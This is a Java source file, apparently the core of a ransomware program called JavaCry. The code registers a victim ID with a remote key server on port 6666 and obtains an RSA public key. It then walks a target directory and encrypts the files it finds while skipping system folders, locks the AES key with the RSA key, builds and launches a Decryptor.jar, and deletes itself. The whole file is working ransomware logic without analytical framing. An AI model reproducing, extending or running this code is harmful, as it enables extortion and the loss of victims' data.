    public static void main(String[] args) {
        System.out.println("You're on " + os); // Windows Mac Linux SunOS FreeBSD
        String h = ""; // id hash to write to sendtome.txt

        KeyClient key_client = new KeyClient(addr, 6666);

        

        /*
         * =========================================================
         * Send victim ID and get public key
         * =========================================================
         */

        if (key_client.getSuccess()) {

            try {
                // send id hash to server
                MessageDigest md = MessageDigest.getInstance("SHA-256");
                byte[] hash = md.digest(String.valueOf(id).getBytes(StandardCharsets.UTF_8));
                String b64hash = Base64.getEncoder().encodeToString(hash);
                h = b64hash;
                key_client.sendString(b64hash);

                // received allocated public key
                String b64pubkey = key_client.recvString();
                byte[] pub = Base64.getDecoder().decode(b64pubkey);
                X509EncodedKeySpec spec = new X509EncodedKeySpec(pub);
                KeyFactory factory = KeyFactory.getInstance("RSA");
                PublicKey public_key = factory.generatePublic(spec);

                crypto = new RSACrypt(public_key);

                key_client.close();
            }

            catch (Exception e) {
                System.out.println(1 + "" + e);
                return;
            }

            /*
             * =========================================================
             * Encrypting the files
             * =========================================================
             */

            File self = new File("JavaCry.jar");
            avoidDir.add(self.getAbsolutePath());
            avoidDir.add("JavaCry.jar");
            avoidDir.add("/windows");
            avoidDir.add("/library");
            avoidDir.add("/boot");
            avoidDir.add("/local");
            avoidDir.add("/program files");
            avoidDir.add("/programdata");
            avoidDir.add("/System");
            avoidDir.add("/Volumes");
            avoidDir.add("/dev");
            avoidDir.add("/etc");
            avoidDir.add("/bin");
            avoidDir.add("$");

            // list files recursively within the target directory
            try (Stream<Path> paths = Files.walk(Paths.get(targetPath))) {
                files = paths.filter(Files::isRegularFile).collect(Collectors.toList());
            }

            catch (Exception e) {
                ;
            }

            // avoid certain directories
            for (int i = 0; i < files.size(); i++) {

                if (avoidDir.contains(files.get(i).toString())) {
                    files.remove(i);
                    i--;
                }
            }

            // This will encrypt files recursively in the target directory
            encryptFiles();

            // This will securely save the AES encryption key by encrypting it with the
            // received RSA public key.
            crypto.SaveAESKey();

            /*
             * =========================================================
             * Generating Decryptor.java
             * =========================================================
             */

            try {
                File f = new File("Decryptor.java");

                if (!f.exists()) {
                    f.createNewFile();
                }

                File s = new File("sendtome.txt");

                if (!s.exists()) {
                    s.createNewFile();
                }

                File m = new File("manifest.txt");

                if (!m.exists()) {
                    m.createNewFile();
                }

                // create Decryptor.jar
                String code = new String(Base64.getDecoder().decode(decryptorPayload));
                code = replaceLine(code, 43, "private static int id = " + String.valueOf(id) + ";");
                FileWriter writer = new FileWriter("Decryptor.java");
                PrintStream manifest = new PrintStream(new File("manifest.txt"));
                manifest.println("Main-Class: Decryptor");
                writer.write(code);
                writer.close();

                // create sendtome.txt
                writer = new FileWriter("sendtome.txt");
                writer.write(h);
                writer.close();

                System.out.println("fetch loading.gif");
                // File loadingImg = new File("/img/loading.gif");
                InputStream imgStream = JavaCry.class.getResourceAsStream("/img/loading.gif");
                Files.copy(imgStream, Paths.get("loading.gif"), StandardCopyOption.REPLACE_EXISTING);

                /*
                 * =========================================================
                 * Compiling Decryptor.java
                 * =========================================================
                 */

                System.out.println("build decryptor");
                process = Runtime.getRuntime()
                        .exec(String.format("javac Decryptor.java", System.getProperty("user.home")));
                BufferedReader b = new BufferedReader(new InputStreamReader(process.getInputStream()));

                String str;

                while ((str = b.readLine()) != null) {
                    System.out.println(str);
                }

                b.close();

                System.out.println("make jar file");
                process = Runtime.getRuntime().exec(String.format(
                        "jar -cvmf manifest.txt Decryptor.jar Decryptor.class Decryptor$1.class Decryptor$2.class ClientThread.class loading.gif",
                        System.getProperty("user.home")));
                b = new BufferedReader(new InputStreamReader(process.getInputStream()));

                while ((str = b.readLine()) != null) {
                    System.out.println(str);
                }

                b.close();
                /*
                 * =========================================================
                 * Deleting the files
                 * =========================================================
                 */

                if (f.delete()) {
                    System.out.println("Deleted the file: " + f.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                if (m.delete()) {
                    System.out.println("Deleted the file: " + m.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                File classFile = new File("Decryptor.class");

                if (classFile.delete()) {
                    System.out.println("Deleted the file: " + classFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                File helperFile = new File("Decryptor$1.class");

                if (helperFile.delete()) {
                    System.out.println("Deleted the file: " + helperFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                helperFile = new File("ClientThread.class");
                if (helperFile.delete()) {
                    System.out.println("Deleted the file: " + helperFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                helperFile = new File("Decryptor$2.class");
                if (helperFile.delete()) {
                    System.out.println("Deleted the file: " + helperFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                File loadingImg = new File("loading.gif");
                if (loadingImg.delete()) {
                    System.out.println("Deleted the file: " + loadingImg.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                self = new File("JavaCry.jar");

                if (self.exists()) {
                    self.delete();
                }

                System.out.println("Done, running Decryptor");

                /*
                 * =========================================================
                 * Running Decryptor.jar
                 * =========================================================
                 */
                process = Runtime.getRuntime()
                        .exec(String.format("java -jar Decryptor.jar", System.getProperty("user.home")));

            }

            catch (Exception e) {
                System.out.println(2 + "" + e);
            }

        }
    }
}
